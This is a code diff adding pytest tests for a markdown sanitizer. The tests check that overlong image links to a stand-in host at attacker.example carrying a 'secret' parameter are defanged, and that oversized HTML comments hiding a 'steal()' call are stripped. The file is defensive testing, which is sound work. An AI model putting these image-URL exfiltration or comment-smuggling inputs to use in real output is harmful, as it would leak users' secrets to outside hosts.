@@ -86,3 +86,29 @@ def test_plain_text_unchanged():
 def test_prose_colon_not_mangled():
     # "data:" followed by a space is prose, not a URI, and must survive.
     assert sanitize_markdown("the data: here") == "the data: here"
+
+
+def test_over_length_image_url_defanged():
+    # An exfiltration URL is naturally long; a length ceiling on the pattern
+    # would let exactly that payload slip past the defang.
+    url = "http://attacker.example/?secret=" + "A" * 2200
+    out = sanitize_markdown(f"![x]({url})")
+    assert "attacker.example" not in out
+    assert "image removed" in out
+
+
+def test_over_length_alt_text_image_defanged():
+    alt = "B" * 600
+    out = sanitize_markdown(f"![{alt}](http://attacker.example/?s=1)")
+    assert "attacker.example" not in out
+    assert "image removed" in out
+
+
+def test_over_length_html_comment_stripped():
+    # A comment longer than any fixed cap, with a '>' in its body, must still be
+    # stripped whole. A cap forces the fallthrough to _strip_html_tags, which
+    # ends the "tag" at the first inner '>' and leaks the remainder as prose.
+    comment = "<!-- " + "x" * 5000 + " > steal() -->"
+    out = sanitize_markdown("a" + comment + "b")
+    assert "steal" not in out
+    assert out == "ab"
